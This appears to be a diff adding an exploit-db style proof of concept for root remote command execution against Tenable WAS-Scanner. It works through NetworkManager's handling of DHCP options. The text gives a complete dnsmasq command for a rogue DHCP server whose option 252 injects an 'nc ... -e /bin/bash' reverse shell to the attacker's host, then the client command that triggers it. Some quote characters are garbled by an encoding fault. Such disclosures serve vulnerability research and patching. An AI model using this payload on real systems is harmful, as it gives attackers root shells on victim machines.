@@ -1,0 +1,28 @@
+# Exploit Title: Tenable WAS-Scanner 7.4.1708 - Remote Command Execution 
+# Discovery by: Sameer Goyal
+# Discovery Date: 2018-05-30
+# Vendor Homepage: https://www.tenable.com/
+# Software Link: https://www.tenable.com/products/tenable-io/web-application-scanning
+# Tested Version: WAS-20180328
+# Vulnerability Type: Remote Command Execution (RCE)
+# Tested on OS: CentOS  7.4.1708
+# Vulnerable daemon version: NetworkManager 1.8.0-11.el7_4
+  
+# Steps to produce the RCE: 
+
+# Step 1:  Setup your malicious DHCP server in the network using dnsmasq:
+
+dnsmasq --interface=eth1 --bind-interfaces  --except-interface=lo --dhcp-range=192.168.51.21,192.168.51.25,1h --conf-file=/dev/null --dhcp-option=6,192.168.51.1 --dhcp-option=3,192.168.51.1 --dhcp-option="252,x'&/home/wizard/nc -nv 192.168.51.1 5555 -e /bin/bash #"
+
+# DHCP-option-3 => gateway IP/ DHCP server IP.
+# DHCP-option-6 => DNS IP, which can be same as gateway IP( not mandatory)
+# DHCP-range => simply subnet range (1h, for 1 hour only)
+# DHCP option=> ì252,xí&<payload> #î
+
+# Start the listener on port 5555 on other terminal .
+# Step 2: Send the normal IP request to the malicious DHCP server from the victim machine.
+
+nmcli con up ìWired Connection 1î && ifconfig
+
+# Step 3: Check the listener, we have got the reverse shell with root privileges.
+# Reference: https://www.exploit-db.com/docs/english/45334-obtaining-command-execution-through-the-networkmanager-daemon.pdf
